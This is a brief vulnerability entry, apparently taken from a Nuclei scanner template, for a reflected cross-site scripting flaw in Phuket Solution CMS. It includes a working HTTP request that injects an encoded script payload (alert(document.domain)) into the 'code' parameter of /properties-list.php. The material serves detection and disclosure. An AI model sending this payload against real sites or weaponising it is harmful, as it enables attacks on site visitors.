# Vulnerability: Phuket Solution CMS - Cross Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`phuket-cms-xss.yaml`)

## Description
Phuket Solutions CMS is vulnerable to Reflected XSS in which an attacker injects malicious executable scripts into the code of a trusted application or website.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

